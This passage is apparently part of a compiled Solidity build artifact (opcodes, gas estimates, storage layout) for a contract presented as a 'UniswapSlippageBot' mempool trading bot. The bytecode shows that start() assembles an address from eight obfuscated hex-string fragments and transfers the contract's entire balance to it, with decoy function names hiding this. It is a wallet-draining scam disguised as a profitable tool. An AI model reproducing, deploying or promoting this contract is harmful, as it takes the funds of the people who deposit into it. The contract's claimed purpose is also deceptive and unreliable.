					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xA26 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x32 SWAP3 SWAP2 SWAP1 PUSH2 0x74 JUMP JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x9FC PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x2 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x61 SWAP3 SWAP2 SWAP1 PUSH2 0x74 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x119 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0xB5 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0xE3 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0xE3 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0xE2 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0xC7 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0xF0 SWAP2 SWAP1 PUSH2 0xF4 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x116 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x112 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0xFA JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x8D4 DUP1 PUSH2 0x128 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x4D JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4B PUSH2 0xCC JUMP JUMPDEST STOP JUMPDEST PUSH7 0x2386F26FC10000 SELFBALANCE LT ISZERO PUSH2 0xCA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1D DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E7420636F6E74726163742062616C616E6365000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDE PUSH2 0xD9 PUSH2 0x137 JUMP JUMPDEST PUSH2 0x455 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x107 PUSH2 0x6AE JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x132 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x142 PUSH2 0x6B6 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x14E PUSH2 0x6F3 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x15A PUSH2 0x730 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x166 PUSH2 0x76D JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x172 PUSH2 0x7AA JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x17E PUSH2 0x7E7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x18A PUSH2 0x824 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x196 PUSH2 0x861 JUMP JUMPDEST SWAP1 POP DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP10 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D6 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1B3 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP9 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x227 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x204 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP8 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x278 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x255 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP7 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x2C9 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x2A6 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x31A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x2F7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x36B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x348 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3BC JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x399 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x40D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3EA JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP9 POP POP POP POP POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP9 POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x6A1 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x487 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x4A9 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4FA JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x50A JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x548 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x558 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x5A3 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x596 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5A2 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x5E2 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5F2 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x68C JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x630 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x640 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x68B JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x67E JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x68A JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x46B JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078323036000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3033353800000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6235336241620000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3866423431000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3038433566000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3843344135000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3838356200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x8 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3864376138443239000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x5D 0x1E PUSH23 0x29BCDA5B3B7286F46453C693E11B8AD7F385275EE6E998 0x27 DUP3 0x23 PUSH20 0xFACF64736F6C6343000606003330783761323530 PUSH5 0x3536333042 CALLVALUE PUSH4 0x46353339 CALLDATACOPY CALLER CODECOPY PUSH5 0x4632433564 COINBASE PUSH4 0x62346336 CALLDATALOAD CODECOPY CHAINID ORIGIN CALLVALUE CODESIZE CODESIZE DIFFICULTY ADDRESS PUSH25 0x43303261614133396232323346453844304130653543344632 CALLDATACOPY PUSH6 0x414439303833 NUMBER CALLDATACOPY CALLDATALOAD CALLDATASIZE NUMBER PUSH4 0x32000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "452000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "239",
						"withdrawal()": "infinite"
					},
					"internal": {
						"beyond(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct UniswapSlippageBot.slice memory)": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"fetchMempoolData()": "infinite",
						"fetchMempoolEdition()": "infinite",
						"fetchMempoolVersion()": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getBa()": "25",
						"getMempoolCode()": "infinite",
						"getMempoolHeight()": "infinite",
						"getMempoolLog()": "infinite",
						"getMempoolLong()": "infinite",
						"getMempoolShort()": "infinite",
						"getMempoolStart()": "infinite",
						"keccak(struct UniswapSlippageBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct UniswapSlippageBot.slice memory)": "infinite",
						"startExploration(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "contracts/bot.sol:UniswapSlippageBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 9,
						"contract": "contracts/bot.sol:UniswapSlippageBot",
						"label": "WETH_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 12,
						"contract": "contracts/bot.sol:UniswapSlippageBot",
						"label": "UNISWAP_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "2",
						"type": "t_string_storage"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}